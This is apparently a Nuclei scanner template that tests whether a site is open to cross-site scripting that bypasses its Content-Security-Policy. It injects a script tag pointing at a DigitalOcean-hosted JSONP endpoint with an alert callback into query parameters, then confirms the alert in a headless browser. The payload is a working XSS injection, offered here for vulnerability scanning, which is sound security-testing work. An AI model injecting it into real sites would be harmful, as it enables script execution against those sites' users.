id: digitalocean-anchor-csp-xss

info:
  name: Content-Security-Policy Bypass via DigitalOcean Anchor
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,digitalocean

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://anchor.digitalocean.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"
        internal: true

headless:
  - steps:
      - action: navigate
        args:
          url: "{{RootURL}}{{trim_prefix(http_matched, RootURL)}}"

      - action: waitload

      - action: waitdialog
        name: digitalocean_anchor_csp_xss
        args:
          type: alert
          timeout: 5000

    matchers:
      - type: dsl
        dsl:
          - "digitalocean_anchor_csp_xss == true" 